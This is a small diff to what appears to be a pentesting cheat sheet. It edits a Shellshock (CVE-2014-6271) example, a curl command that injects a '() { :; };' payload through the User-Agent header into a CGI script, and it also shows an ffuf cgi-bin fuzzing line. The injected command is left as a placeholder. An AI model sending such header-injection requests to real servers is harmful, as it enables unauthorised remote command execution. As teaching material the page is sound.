@@ -81,7 +81,7 @@ $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u URL/cgi-bin/FU
 ⚠️ Bash `[<4.3]` has a vulnerability called [shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271):
 
 ```shell!
-$ curl -H 'User-Agent: () { :; }; <write code here>' bash -s :'' 'URL/cgi-bin/some_script'
+$ curl -H 'User-Agent: () { :; }; <write code here>' 'URL/cgi-bin/some_script'
 ```
 </div></div>
 
